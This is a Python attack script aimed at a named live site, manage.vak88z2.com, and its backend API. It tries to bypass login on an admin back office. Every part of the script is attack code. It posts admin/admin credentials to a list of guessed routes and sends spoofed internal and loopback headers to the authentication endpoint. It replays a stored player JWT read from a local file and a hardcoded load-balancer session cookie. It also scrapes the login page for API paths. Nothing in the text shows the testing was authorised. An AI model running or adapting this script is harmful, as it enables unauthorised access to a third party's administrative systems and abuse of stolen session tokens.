#!/usr/bin/env python3
"""probe_nuxt_bo_proxy.py — Find Nuxt SSR proxy routes on manage.vak88z2.com.

   bgapi POST endpoints crash at middleware (ISE 401) when called directly.
   The Nuxt BO frontend at manage.vak88z2.com may proxy to bgapi with
   internal headers (X-Internal-Key, X-Service-Key, etc.) that bypass auth.

   1. Enumerate Nuxt server-side API routes (/api/*, /server/*)
   2. Try direct bgapi POST with common internal headers
   3. Check if manage.vak88z2.com proxies /api/auth → bgapi /bo/authentication
"""
import json, pathlib, requests, time

TID = "af6efb584a3d317b5a11ab6209b88e1b"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
BO_DOMAIN = "manage.vak88z2.com"
BO_BASE   = f"https://{BO_DOMAIN}"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

DOMAIN = "m.vak88z2.com"

# ── 1. Nuxt server-side routes ────────────────────────────────────────────────
print("=== 1. Nuxt BO server routes ===")
nuxt_paths = [
    "/api/auth/login",
    "/api/auth",
    "/api/authentication",
    "/api/bo/authentication",
    "/api/login",
    "/server/api/auth",
    "/server/api/login",
    "/_nuxt/api/auth",
    "/api/v1/auth",
    "/api/v1/login",
    "/api/user/login",
    "/api/admin/login",
]
for path in nuxt_paths:
    try:
        r = requests.post(
            f"{BO_BASE}{path}",
            headers={"Content-Type": "application/json",
                     "Origin": f"https://{BO_DOMAIN}",
                     "Referer": f"https://{BO_DOMAIN}/account/login"},
            json={"strategy": "local", "username": "admin", "password": "admin",
                  "domain": DOMAIN},
            timeout=8,
        )
        if r.status_code not in (404, 405):
            print(f"  [!!!] {path}: HTTP {r.status_code}: {r.text[:200]}")
        else:
            print(f"  {path}: {r.status_code}")
    except Exception as e:
        print(f"  {path}: ERR {e}")

# ── 2. bgapi POST with internal headers ───────────────────────────────────────
print("\n=== 2. bgapi POST /bo/authentication with internal headers ===")

VAK_JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

internal_header_sets = [
    {"X-Internal-Key": "internal"},
    {"X-Service-Key": "service"},
    {"X-Internal": "true"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Nuxt-Internal": "1"},
    {"X-Internal-Token": TID},
    {"X-Api-Key": TID},
    {"Authorization": f"Bearer {VAK_JWT}", "X-Internal": "true"},
    # Try with Nuxt origin
    {"Origin": f"https://{BO_DOMAIN}", "Referer": f"https://{BO_DOMAIN}/"},
    # Cloudflare tunnel header pattern
    {"CF-Access-Client-Id": "tunnel"},
    # Common microservice auth
    {"X-Service-Auth": "bgapi-internal"},
]

for hdrs in internal_header_sets:
    base = {"Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}
    base.update(hdrs)
    try:
        r = requests.post(
            f"{BGAPI}/bo/authentication",
            headers=base,
            json={"strategy": "local", "username": "admin", "password": "admin",
                  "domain": DOMAIN},
            timeout=8,
        )
        key_label = list(hdrs.keys())[0]
        if r.status_code != 401 or "Incorrect" in r.text:
            print(f"  [!!!] {key_label}: HTTP {r.status_code}: {r.text[:200]}")
        elif "Internal Server Error" not in r.text:
            # Different error = different code path
            print(f"  DIFF {key_label}: HTTP {r.status_code}: {r.text[:100]}")
    except Exception as e:
        print(f"  ERR {list(hdrs.keys())[0]}: {e}")

# ── 3. Check manage.vak88z2.com /account/login page for JS clues ─────────────
print("\n=== 3. BO login page JS analysis ===")
try:
    r = requests.get(f"{BO_BASE}/account/login", timeout=10)
    print(f"  GET /account/login: HTTP {r.status_code}, {len(r.text)}B")
    # Look for API endpoint references
    import re
    api_refs = re.findall(r'["\']([/][a-z/_-]{3,50})["\']', r.text)
    interesting = [x for x in set(api_refs) if any(k in x for k in ('api', 'auth', 'login', 'bo', 'admin'))]
    for ref in sorted(interesting)[:20]:
        print(f"  API ref: {ref}")

    # Look for Nuxt build manifest / chunk files
    chunks = re.findall(r'src="([^"]+\.js)"', r.text)
    for c in chunks[:5]:
        print(f"  JS chunk: {c}")
except Exception as e:
    print(f"  ERR: {e}")

# ── 4. Try /bo/authentication with player JWT as passthrough ──────────────────
print("\n=== 4. /bo/authentication with player JWT (pass-through probe) ===")
for strategy in ["local", "jwt", "bearer"]:
    r = requests.post(
        f"{BGAPI}/bo/authentication",
        headers={"Content-Type": "application/json",
                 "Authorization": f"Bearer {VAK_JWT}",
                 "Cookie": f"AWSALB={AWSALB}"},
        json={"strategy": strategy, "accessToken": VAK_JWT,
              "username": "admin", "password": "admin", "domain": DOMAIN},
        timeout=8,
    )
    if r.status_code != 401 or "Incorrect" in r.text:
        print(f"  [!!!] strategy={strategy}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  strategy={strategy}: {r.status_code}")

print("\n=== DONE ===")
